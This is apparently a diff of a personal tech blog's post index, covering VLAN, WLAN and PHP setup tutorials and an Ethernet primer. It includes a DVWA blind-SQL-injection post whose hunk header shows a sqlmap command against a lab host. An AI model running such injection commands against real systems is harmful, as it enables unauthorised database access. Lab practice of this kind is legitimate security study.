+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145058.png" alt="8" loading="lazy"></p>
+<h3 id="VLAN基本配置"><a href="#VLAN基本配置" class="headerlink" title="VLAN基本配置"></a>VLAN基本配置</h3><ul>
+<li>创建VLAN<ul>
+<li>步骤1：创建VLAN ： Switch(config)#vlan vlan-id </li>
+<li>步骤2：命名VLAN：Switch(config-vlan)#name vlan-name</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">RG-S2652G(config)#vlan 10 &#x2F;&#x2F; 创建VLAN
+RG-S2652G(config-vlan)# name JiShuBu &#x2F;&#x2F;VLAN的命名，方便运维
+RG-S2652G(config)#vlan 20
+RG-S2652G(config-vlan)# name CaiWuBu</code></pre>
+
+<ul>
+<li>配置Access口<ul>
+<li>步骤1：进入端口配置模式 :   Swtich(config)#interface interface</li>
+<li>步骤2：将端口模式设置为接入端口:   Switch(config-if)#switchport mode access </li>
+<li>步骤3：将端口添加到特定VLAN :    Switch(config-if)#switchport access vlan vlan-id</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">RG-S2652G(config)#interface range f0&#x2F;1-2
+RG-S2652G(config-if-range)#switchport access vlan 10 &#x2F;&#x2F;接口划分到VLAN 10
+RG-S2652G(config)#interface f0&#x2F;3
+RG-S2652G(config-if)#switchport access vlan 20</code></pre>
+
+<ul>
+<li><p>将一组端口加入VLAN	</p>
+<ul>
+<li>步骤1：进入到一组需要添加到VLAN的端口中 :   Swtich(config)#interface range interface-range </li>
+<li>步骤2：将端口模式设置为接入端口  :   Switch(config-range-if)#switchport mode access </li>
+<li>步骤3：将一组端口划分到指定VLAN :   Switch(config-range-if)#swtichport access vlan vlan-id</li>
+</ul>
+</li>
+<li><p>配置Trunk </p>
+</li>
+<li><p>步骤1：进入需要配置的端口:   swtich(config)#interface interface </p>
+</li>
+<li><p>步骤2：将端口的模式设置为Trunk :    Switch(config-if)#switchport mode trunk </p>
+</li>
+<li><p>步骤3：定义Trunk链路的VLAN控制行为列表 （VLAN修剪等）（可选，慎用）:  Switch(config-if)#switchport trunk allowed vlan { all | [ add | remove | except ] } vlan-list</p>
+</li>
+<li><p>查看、删除VLAN </p>
+<ul>
+<li>删除VLAN : Switch(config)#no vlan VLAN-id </li>
+<li>查看配置信息 : Switch# show vlan</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie#show vlan
+VLAN Name 		Status 		Ports 
+---- -------------------------------- --------- -----------------------------------
+1 VLAN0001 		STATIC 		Fa0&#x2F;4, Fa0&#x2F;5, Fa0&#x2F;6, Fa0&#x2F;7 
+								 			Fa0&#x2F;8, Fa0&#x2F;9, Fa0&#x2F;10, Fa0&#x2F;11 
+											 Fa0&#x2F;12, Fa0&#x2F;13, Fa0&#x2F;14, Fa0&#x2F;15 
+											 Fa0&#x2F;16, Fa0&#x2F;17, Fa0&#x2F;18, Fa0&#x2F;19 
+											 Fa0&#x2F;20, Fa0&#x2F;21, Fa0&#x2F;22, Fa0&#x2F;23 
+											 Fa0&#x2F;24, Gi0&#x2F;25, Gi0&#x2F;26 
+10 VLAN0010 	STATIC	 	Fa0&#x2F;1, Fa0&#x2F;2
+20 VLAN0020 	STATIC 		Fa0&#x2F;3</code></pre>
+
+<h1 id="VLAN间通讯"><a href="#VLAN间通讯" class="headerlink" title="VLAN间通讯"></a>VLAN间通讯</h1><h3 id="VLAN间通信-——-单臂路由"><a href="#VLAN间通信-——-单臂路由" class="headerlink" title="VLAN间通信 —— 单臂路由"></a>VLAN间通信 —— 单臂路由</h3><ul>
+<li>在如下应用场景中：单位内部不同子网间需要通信</li>
+<li>早期网络将二层交换机与路由器结合，使用“单臂路由”方式进行VLAN间路由</li>
+<li>数据帧在Trunk链路上往返发送，会有转发延迟 </li>
+<li>路由器软件转发IP报文，如果VLAN间路由数据量较大，会消耗大量CPU资源，造成转发性能瓶颈</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145105.png" alt="9" loading="lazy"></p>
+<h3 id="VLAN间通信-——-三层交换机"><a href="#VLAN间通信-——-三层交换机" class="headerlink" title="VLAN间通信 —— 三层交换机"></a>VLAN间通信 —— 三层交换机</h3><ul>
+<li>三层交换机集成了VLAN内部的二层交换和VLAN间路由转发功能 </li>
+<li>简单说，三层交换技术就是“二层交换技术+三层转发”，解决了上述问题</li>
+<li>二层交换基于MAC地址，由硬件实现，低延迟 </li>
+<li>三层交换基于IP地址，使用硬件ASIC技术，转发速度高</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145108.png" alt="10" loading="lazy"></p>
+<h3 id="交换机表项的建立与数据转发"><a href="#交换机表项的建立与数据转发" class="headerlink" title="交换机表项的建立与数据转发"></a>交换机表项的建立与数据转发</h3><ul>
+<li><p>PC1和PC2连接在同一台三层交换机上，位于不同的VLAN，从PC1 ping PC2的通信过程如下：</p>
+<ul>
+<li>1、PC1判断目标PC2不在同一个子网中，PC发送ARP解析网关的MAC地址 </li>
+<li>2、交换机发送ARP应答（包含VLAN10的MAC），同时更新ARP表项与MAC地址表（ PC1的IP和MAC地址）</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145112.png" alt="11" loading="lazy"></p>
+<ul>
+<li>3、PC1发送目的IP地址为192.168.20.2的ICMP请求 </li>
+<li>4、交换机收到ICMP请求，根据报文的目的MAC是VLAN10接口MAC，判断该报文为三层转发报文 </li>
+<li>5、交换机根据报文目的IP地址192.168.20.2查找三层转发表项，起初并未建立任何记录，交换机将查找软件路由表， 发现一个直连路由，继续查找软件ARP表，起初ARP表中没有关于PC2的表项，交换机继续向VLAN20所有端口发送 ARP请求，以获取PC2的MAC地址</li>
+<li>6、PC2收到交换机发送的ARP请求，发送ARP应答，并将自己的MAC地址包含其中</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145115.png" alt="12" loading="lazy"></p>
+<ul>
+<li>7、交换机收到PC2的ARP应答，记录PC2的IP和MAC地址对应关系到自己的ARP表，并将PC1的ICMP请求发送给 PC2。交换机将在三层转发表项中添加表项（包含IP、MAC、VLAN、出端口），后续的PC1发往PC2的报文就可以 直接通过硬件三层表项直接转发。 </li>
+<li>8、PC2收到交换机转发过来的ICMP请求，将回应ICMP应答给交换机，交换机将直接把应答报文由硬件三层交换转 发给PC1</li>
+<li>9、后续报文都经过查MAC表、查三层转发表的过程，直接进入硬件转发。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145118.png" alt="13" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VScode简单配置</title>
+    <url>/posts/83ecd2a4/</url>
+    <content><![CDATA[<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>点击左侧工具栏的extensions或者使用快捷键【Ctrl+Shift+X】，输入chinese，点击Install安装中文简体</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194438.png" alt="1" loading="lazy"></p>
+<p>使用快捷键【Ctrl+Shift+P】弹出查找命令框，输入language, 找到Configure Display Language，点击，选择locale属性为”zh-CN”</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194441.png" alt="2" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194443.png" alt="3" loading="lazy"></p>
+<h2 id="VSCode配置Python开发环境"><a href="#VSCode配置Python开发环境" class="headerlink" title="VSCode配置Python开发环境"></a>VSCode配置Python开发环境</h2><p>安装python环境</p>
+<p>（略）</p>
+<p>打开VSCode, 搜索插件Python并安装。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194445.png" alt="4" loading="lazy"></p>
+<p>Ctrl+Shift+P  &gt; Command Palette，打开命令面板输入<code>Python: Select Interpreter</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194447.png" alt="5" loading="lazy"></p>
+<p>新建一个Python文件输入<code>print(&quot;helloword&quot;)</code>后运行</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194449.png" alt="7" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WLAN漫游</title>
+    <url>/posts/ba6ef991/</url>
+    <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145903.png" alt="image-20220615145902818" loading="lazy"></p>
+<h2 id="配置如下："><a href="#配置如下：" class="headerlink" title="配置如下："></a>配置如下：</h2><h3 id="路由器的配置："><a href="#路由器的配置：" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-SW
+int g0&#x2F;0&#x2F;0
+ip add 10.1.1.2 30
+int lo0
+ip add 1.1.1.1 32
+ospf 1
+area 0.0.0.0
+network 1.1.1.1 0.0.0.0
+network 10.1.1.0 0.0.0.3
+</code></pre>
+
+
+
+
+
+<h3 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
+sys
+LuRen-SW
+vlan batch 10 100
+int g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;3
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+</code></pre>
+
+
+
+<h3 id="AC的配置"><a href="#AC的配置" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-AC
+vlan batch 12 10 100
+int g0&#x2F;0&#x2F;1
+port link-type access
+port default vlan 12
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int vlan 10
+ip add 172.16.1.1 24
+dhcp enable
+int vlan 10
+dhcp select interface
+int vlan 12
+ip add 10.1.1.1 30
+int vlan 100
+ip add 172.16.100.1 24
+dhcp select interface
+quit
+capwap source interface vlan 10
+wlan
+ap whitelist mac 00e0-fcc7-7640
+ap whitelist mac 00e0-fc53-2e60
+security-profile name LuRen	
+security wpa-wpa2 psk pass-phrase 12345678 aes
+
+
+
+
+quit
+ssid-profile name LuRen-ssid
+ssid LuRen
+quit
+regulatory-domain-profile name LuRen-domain
+country-code cn
+quit
+vap-profile name LuRen-vap
+forward-mode tunnel
+service-vlan vlan-id 100
+ssid-profile LuRen-ssid
+
+security-profile LuRen
+
+
+quit
+rrm-profile name LuRen-rrm
+smart-roam enable
+smart-roam roam-threshold check-snr check-rate 
+smart-roam roam-threshold snr 30
+smart-roam roam-threshold rate 30
+quit
+radio-2g-profile name LuRen-2g
+
+
+
+rrm-profile LuRen-rrm
+quit
+radio-5g-profile name LuRen-5g
+rrm-profile LuRen-rrm
+quit
+ap-group name ap
+radio 0
+radio-2g-profile LuRen-2g
+vap-profile LuRen-vap wlan 1
+quit
+radio 1	
+radio-5g-profile LuRen-5g
+
+
+vap-profile LuRen-vap wlan 1
+quit
+quit
+ap-id 0
+ap-group ap
+ap-id 1
+ap-group ap
+</code></pre>
+
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证AP上线</p>
+<pre class="language-none"><code class="language-none">[LuRen-AC]dis ap all
+Info: This operation may take a few seconds. Please wait for a moment.done.
+Total AP information:
+nor  : normal          [2]
+-------------------------------------------------------------------------------------------------
+ID   MAC            Name           Group IP           Type            State STA 
+Uptime
+-------------------------------------------------------------------------------------------------
+0    00e0-fc04-7ed0 00e0-fc04-7ed0 ap 172.16.1.133 AP3030DN nor   0 5M:45S
+1    00e0-fc47-3a80 00e0-fc47-3a80 ap 172.16.1.40 AP3030DN  nor   0 5M:36S
+-------------------------------------------------------------------------------------------------
+Total: 2
+</code></pre>
+
+
+
+
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="路由器的配置：-1"><a href="#路由器的配置：-1" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sysname LuRen-R0
+int g0&#x2F;0&#x2F;0
+ip add 10.1.1.2 30
+int lo0
+ip add 1.1.1.1 32
+ospf 1
+area 0.0.0.0
+network 1.1.1.1 0.0.0.0
+network 10.1.1.0 0.0.0.3
+</code></pre>
+
+
+
+<h3 id="交换机配置-1"><a href="#交换机配置-1" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
+sys
+sys LuRen-SW
+vlan batch 10 100
+int g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;3
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+</code></pre>
+
+
+
+<h3 id="AC的配置-1"><a href="#AC的配置-1" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-AC
+int vlan 1
+ip add 192.168.200.100 24
+quit
+http server enable
+</code></pre>
+
+<h3 id="Web登录"><a href="#Web登录" class="headerlink" title="Web登录"></a>Web登录</h3><pre class="language-none"><code class="language-none">略</code></pre>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>eNSP</category>
+        <category>WLAN和安全</category>
+      </categories>
+      <tags>
+        <tag>eNSP</tag>
       </tags>
   </entry>
   <entry>
@@ -3009,129 +3958,6 @@ cond(no)-&gt;op</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>centos7安装PHP5</title>
-    <url>/posts/b394315b/</url>
-    <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/xxdebug/p/14142266.html">centos7安装PHP5 - xiaoxiaoの - 博客园 </a></p>
-<ol>
-<li>创建文件夹</li>
-</ol>
-<pre class="language-none"><code class="language-none">mkdir &#x2F;usr&#x2F;local&#x2F;src&#x2F;php 
-
-cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813652.png" alt="1" loading="lazy"></p>
-<ol start="2">
-<li>安装依赖</li>
-</ol>
-<pre class="language-none"><code class="language-none">yum install -y gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libpng libpng-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses curl openssl-devel gdbm-devel db4-devel libXpm-devel libX11-devel gd-devel gmp-devel readline-devel libxslt-devel expat-devel xmlrpc-c xmlrpc-c-devel</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813996.png" alt="2" loading="lazy"></p>
-<ol start="3">
-<li>解压下载的php源码包</li>
-</ol>
-<pre class="language-none"><code class="language-none">tar -xzvf +你的包名.tar.gz</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814770.png" alt="3" loading="lazy"></p>
-<ol start="4">
-<li><p>将解压的文件复制到&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;下</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814486.png" alt="4" loading="lazy"></p>
-</li>
-<li><p>进入&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25这个文件夹后在终端输入如下命令</p>
-</li>
-</ol>
-<pre class="language-none"><code class="language-none">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814634.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc --enable-fpm --enable-sysvsem --enable-sockets --enable-pcntl --enable-mbstring --enable-mysqlnd --enable-opcache --enable-shmop --enable-zip --enable-ftp --enable-gd-native-ttf --enable-wddx --enable-soap</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814784.png" alt="6" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">make</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814067.png" alt="7" loading="lazy"></p>
-<ol start="6">
-<li>安装</li>
-</ol>
-<pre class="language-none"><code class="language-none">make install
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default php-fpm.conf
-
-cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini
-
-cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814525.png" alt="8" loading="lazy"></p>
-<ol start="7">
-<li>添加权限</li>
-</ol>
-<pre class="language-none"><code class="language-none">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
-
-<ol start="8">
-<li>添加开机启动</li>
-</ol>
-<pre class="language-none"><code class="language-none">chkconfig --add php-fpm</code></pre>
-
-<ol start="9">
-<li>设置启动等级</li>
-</ol>
-<pre class="language-none"><code class="language-none">chkconfig --level 35 php-fpm on
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf
-
-vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf 
-
-找到 ;pid &#x3D; run&#x2F;php-fpm.pid 去掉前面的分号</code></pre>
-
-<ol start="10">
-<li>启动</li>
-</ol>
-<pre class="language-none"><code class="language-none">service php-fpm start</code></pre>
-
-<ol start="11">
-<li>设置环境变量</li>
-</ol>
-<pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;profile 
-
-底部添加
-PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source &#x2F;etc&#x2F;profile</code></pre>
-
-<ol start="12">
-<li>查看安装版本</li>
-</ol>
-<pre class="language-none"><code class="language-none">php -v</code></pre>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>CentOS7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/posts/4a17b156/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>dvwa--盲注</title>
     <url>/posts/75e4ecec/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -3362,6 +4188,24 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/posts/4a17b156/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>hexo博客上使用waline评论系统</title>
     <url>/posts/5b3b1c7f/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Waline 是一款从 <a href="https://valine.js.org/">Valine</a> 衍生的带后端评论系统。部署简单使用方面，干净整洁，可匿名评论。</p>
@@ -3528,7 +4372,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-hhScAmrJ" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-lINEqhwr" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -3761,6 +4605,243 @@ hexo generate
       </categories>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二层交换机工作原理</title>
+    <url>/posts/29adaa64/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+
+<h2 id="以太网概述"><a href="#以太网概述" class="headerlink" title="以太网概述"></a>以太网概述</h2><h3 id="以太网产生背景"><a href="#以太网产生背景" class="headerlink" title="以太网产生背景"></a>以太网产生背景</h3><ul>
+<li>早期的网络设备之间互相通信，仅能实现单点通信</li>
+<li>同样的物理环境，只能与一台设备进行互联 </li>
+<li>为了提高传输效率，简化网络拓扑，需要一种能够进行多点通信的机制</li>
+</ul>
+<h3 id="以太网的出现"><a href="#以太网的出现" class="headerlink" title="以太网的出现"></a>以太网的出现</h3><ul>
+<li>共享型以太网诞生，其逻辑拓扑是多路访问总线型网络，所有节点共享同一介质 </li>
+<li>一个节点发送的数据能被传输到该网段上所有设备节点 </li>
+<li>但是，任意时刻信道只能传输一路数据 </li>
+<li>每台主机发出的数据可以被其他所有主机所接收</li>
+<li>如果有两台主机同时发送数据，则产生冲突</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094624.png" alt="1" loading="lazy"></p>
+<h3 id="数据发送机制（CSMA-x2F-CD）"><a href="#数据发送机制（CSMA-x2F-CD）" class="headerlink" title="数据发送机制（CSMA&#x2F;CD）"></a>数据发送机制（CSMA&#x2F;CD）</h3><ul>
+<li>使用CSMA&#x2F;CD（带有冲突检测的载波侦听多路访问）机制决定节点如何发送数据<ul>
+<li>先听后发，边发边听，冲突回退</li>
+<li>同一个网段上所有节点处于一个冲突域中，共享带宽，只能工作在半双工模式下</li>
+<li>现代交换网络使用交换机组网，每个接口属于单独冲突域，工作在全双工模式下，CSMA&#x2F;CD机制就不适用了</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094622.png" alt="2" loading="lazy"></p>
+<h3 id="MAC-编址"><a href="#MAC-编址" class="headerlink" title="MAC 编址"></a>MAC 编址</h3><ul>
+<li>IEEE 802标准中使用MAC地址作为识别以太网中网络设备硬件地址的唯一标识符 </li>
+<li>MAC地址由48位二进制数组成，通常表示为12个16进制数 </li>
+<li>前24位是组织唯一标识符OUI（厂商识别码），后24位是节点标识符（厂商分配的序列号）</li>
+<li>OUI 相同的所有 MAC 地址的最后 24位必须是唯一的值</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094630.png" alt="3" loading="lazy"></p>
+<h3 id="以太网帧及帧类型"><a href="#以太网帧及帧类型" class="headerlink" title="以太网帧及帧类型"></a>以太网帧及帧类型</h3><ul>
+<li>网络层的数据包被加上帧头和帧尾，就构成了可由数据链路层识别的以太网数据帧</li>
+<li>现在最常见的是：Ethernet II、802.3 SAP和SNAP  以太网 Ehternet II 帧格式</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094634.png" alt="4" loading="lazy"></p>
+<ul>
+<li><p>“类型”字段的值大于或等于0x0600时，表示上层（网络层）数据使用的协议类型，例如：0x0800表示 IP协议</p>
+</li>
+<li><p>根据以太网帧的目标MAC,可以分为 </p>
+<ul>
+<li>单播：广播域中指定节点接收</li>
+<li>广播：MAC地址是全1(即FFFF.FFFF.FFFF)，广播域中所有节点都可以接收</li>
+<li>组播：MAC地址以01开头，只有加入该组的节点才能接收</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094639.png" alt="5" loading="lazy"></p>
+<h3 id="以太网概述-1"><a href="#以太网概述-1" class="headerlink" title="以太网概述"></a>以太网概述</h3><ul>
+<li>以太网是目前世界上占主导地位的LAN技术 </li>
+<li>以太网由OSI模型的物理层和数据链路层的协议组成</li>
+<li>80年代由DEC、Intel 和 Xerox (DIX) 协会发布了第一个以太网标准，并由IEEE 标准委员会发布了 LAN 标 准<ul>
+<li>IEEE802.3标准定义物理层和数据链路层的MAC子层</li>
+<li>IEEE802.2标准定义了数据链路层的LLC子层</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094643.png" alt="6" loading="lazy"></p>
+<ul>
+<li>以太网定义了第2层协议（链路层协议）和第1层技术（线缆、接口）</li>
+<li>以太网依靠数据链路层的两个单独子层运行<ul>
+<li>逻辑链路控制(LLC)子层处理上层和下层之间的通信。可以由软件（网卡驱动程序）实现 </li>
+<li>介质访问控制(MAC)子层定义了介质访问控制、编址、数据封装。可以由硬件（网卡）实现</li>
+<li>物理层定义了介质上的比特流、接口和拓扑</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094647.png" alt="7" loading="lazy"></p>
